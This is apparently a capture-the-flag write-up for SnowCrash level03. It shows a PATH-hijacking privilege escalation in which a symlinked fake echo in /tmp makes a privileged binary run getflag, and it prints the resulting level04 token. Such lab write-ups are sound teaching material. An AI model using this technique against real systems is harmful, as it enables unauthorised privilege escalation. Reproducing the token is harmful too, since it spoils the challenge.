
objdump -d level03 -M intel > main.asm

## Step 1: Create a Symbolic Link

Use the ln command to create a symbolic link named echo in the /tmp directory that points to /bin/getflag. This effectively tricks the level03 binary into calling getflag when it looks for the echo command.

``` console
level03@SnowCrash:/tmp$ ln -sf /bin/getflag /tmp/echo
```

ln: The command to create links.
-s: This flag tells ln to create a symbolic link.
-f: This flag forces the link to be created, overwriting any existing file or link.
/bin/getflag: The target command you want to run (the actual command).
/tmp/echo: The name of the symbolic link you're creating.

## Step 2: Modify the PATH Environment Variable

Adjust the PATH: You need to modify the PATH environment variable to prioritize the /tmp directory over the system directories. This ensures that when level03 tries to call echo, it finds your symbolic link first.

``` console
level03@SnowCrash:/tmp$ export PATH=/tmp:$PATH
```

PATH=/tmp:$PATH: This sets the PATH variable to include /tmp before the rest of the directories in the existing PATH.

## Step 3: Execute the Vulnerable Binary
Run the level03 Binary: Now that the symbolic link is set up and the PATH is adjusted, you can run the level03 binary.

``` console
level03@SnowCrash:/tmp$ ~/level03
Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
```

## Step 4: Use token to enter level04
``` console
level03@SnowCrash:~$ su level04
Password: qi0maab88jeaj46qoumi7maus
```

